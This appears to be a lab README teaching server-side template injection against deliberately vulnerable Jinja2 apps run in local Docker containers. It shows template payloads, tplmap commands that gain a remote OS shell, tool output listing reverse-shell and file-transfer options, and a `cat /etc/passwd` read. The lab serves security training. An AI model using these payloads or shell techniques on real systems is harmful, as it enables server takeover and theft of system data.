# Server-Side Template Injection
> Server-Side Template Injection using python2.7 and Jinja2 template 

## Basic Server-Side Template Injection (SSTI)

* Using Docker 

* Step 1: Run application as a docker

```
docker run --name ssti-basic -d  -p 5000:5000 ti1akt/ssti-basic
```

* Step 2: Open browser

```
http://127.0.0.1:5000
```

* Step 3: In the Input field enter your name. Then click submit button

* Step 4: It will redirect into another page with entered text.

* Step 5: Click Back to Home button

* Step 5: Now try `{{ 1 + 1 }}` in the input field then click submit. It should show `2`.

* Step 6: Let's try some payload

```
{{request.__class__}}
```

**Note:** It should return  template name.

### Clean docker 

* Step 1: Stop the application

```
docker stop ssti-basic && docker rm ssti-basic
```

## Advanced Server-Side Template Injection (SSTI)

* Using Docker 

* Step 1: Run application as a docker

```
docker run --name ssti-advanced -d -p 5000:5000 ti1akt/ssti-advanced
```

* Step 2: Open browser

```
http://127.0.0.1:5000
```

* Step 3: Click `Create Page` button and create some page.

* Step 4: Once created click `view` button and preview the website page.

* Step 5: In the address bar add  `http://127.0.0.1:5000/ssti?name=Tilak` and press enter.

* Step 6: It will show what you entered in the `name`.

* Step 7: Now Let's try with tool to identify and gain **RCE** .

* Step 8: Download `tplmap` [Click Here](https://github.com/epinna/tplmap)

* Step 9: Let's scan the application

```
./tplmap.py -u 'http://127.0.0.1:5000/ssti?name=Tilak'
```

* You will see a result like this

```
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux2
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files
```

* Step 10: Let's  try to gain `RCE`

```
./tplmap.py --os-shell -u 'http://127.0.0.1:5000/ssti?name=Tilak'
```

* You will see a result like this

```
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: name
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux2
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux2 $
```

* Now just try some commands

```
ls
```

```
whoami
```

```
cat /etc/passwd
```


### Clean docker 

* Step 1: Click `ctrl+c`

* Step 2: Stop container

```
docker stop ssti-advanced && docker rm ssti-advanced
```